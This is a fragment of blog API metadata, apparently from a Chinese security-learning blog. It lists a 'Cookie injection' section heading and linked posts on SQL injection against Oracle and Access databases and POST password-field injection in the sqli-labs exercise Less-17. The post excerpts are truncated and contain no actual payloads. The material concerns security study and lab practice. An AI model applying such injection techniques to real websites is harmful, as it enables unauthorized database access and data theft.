href=\"#0x01%EF%BC%88Cookie%E6%B3%A8%E5%85%A5%EF%BC%89-1\"><span class=\"toc-text\">0x01（Cookie注入）</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"SQL注入-Oracle等注入","uid":"11c6b3c7b164ff24fb9d530dce97a986","slug":"SQL注入-Oracle等注入","date":"2022-02-07T10:57:10.000Z","updated":"2022-02-13T15:39:28.635Z","comments":true,"path":"api/articles/SQL注入-Oracle等注入.json","keywords":null,"cover":[],"text":"[TOC] ##数据库注入 除Access数据库之外，其他类型数据库注入流程： 什么决定网站注入点的用户权限？ SQL的配置文件用户名 Access注入（特殊）####Access数据结构 ​ 表名 ​ 列名 ​ 数据 注意：1、Access数据库只有一个数据库； ​ 2、 Ac...","link":"","photos":[],"count_time":{"symbolsCount":"4.4k","symbolsTime":"4 mins."},"categories":[{"name":"信息搜集","slug":"信息搜集","count":10,"path":"api/categories/信息搜集.json"}],"tags":[{"name":"信息搜集","slug":"信息搜集","count":11,"path":"api/tags/信息搜集.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"POST注入--基于Password的注入","uid":"9ed0d530657a494b586000f6c049b35e","slug":"POST注入-基于Password的注入","date":"2022-02-05T05:45:34.000Z","updated":"2022-02-13T15:41:34.276Z","comments":true,"path":"api/articles/POST注入-基于Password的注入.json","keywords":null,"cover":[],"text":"[TOC] Less-17说实话，看到的时候挺吃惊的，没见过，试了很多payload，都注不进去，它还嘲讽我： 0x01查了一下资料，又看了一下源码发现username已经不能被注入了，原因是源码将uname字段进行了检查，导致uname不能够构造payload进行注入。 （ch...","link":"","photos":[],"count_time":{"symbolsCount":962,"symbolsTime":"1 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}